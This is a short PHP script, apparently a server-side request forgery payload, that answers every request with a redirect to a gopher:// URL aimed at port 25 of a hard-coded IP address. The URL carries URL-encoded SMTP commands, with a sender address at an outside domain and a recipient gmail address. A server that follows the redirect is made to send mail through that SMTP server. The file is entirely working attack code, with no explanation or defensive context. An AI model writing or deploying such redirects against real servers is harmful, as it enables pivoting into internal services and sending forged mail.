
<?php
        $commands = array(
                'HELO test.org',
                'MAIL FROM: admin@abacus.com',
                'RCPT TO: alert.wids@gmail.com',
                'DATA',
                'Test mail',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://64.225.58.75:25/_'.$payload);
?>
